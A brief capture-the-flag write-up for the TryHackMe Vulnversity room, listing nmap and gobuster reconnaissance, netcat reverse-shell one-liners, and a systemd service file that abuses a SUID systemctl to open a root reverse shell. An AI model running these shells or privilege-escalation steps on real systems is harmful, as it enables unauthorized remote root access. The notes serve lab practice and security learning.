---
layout: md
title: TryHackMe Vulnversity CTF
description: Notes on tryhackme.com's vulnversity challenge
tags: ['security', 'tryhackme']
sort_key: 1
---

{% include project-headers.html %}

Use nmap to scan ports and try to find details about services and versions on those ports 
```bash
nmap -sV -sC <target>
```

Try bruteforce webpages/directories using [gobuster](https://github.com/OJ/gobuster)
```bash
gobuster dir -u <webapp> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```

#### Netcat commands
```
nc -lvnp 4444 [> /path/to/file.ext]
nc -e /bin/bash <ip> <port>

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f
```

Exploiting systemctl (SUID bit was set), reverse shell using netcat openbsd from systemctl service.
```bash
[Unit]
Description=root-shell

[Service]
ExecStart=/bin/bash -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f"

[Install]
WantedBy=multi-user.target
```
```bash
/bin/systemctl enable /path/to/root-shell.service
/bin/systemctl start root-shell
```

[PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)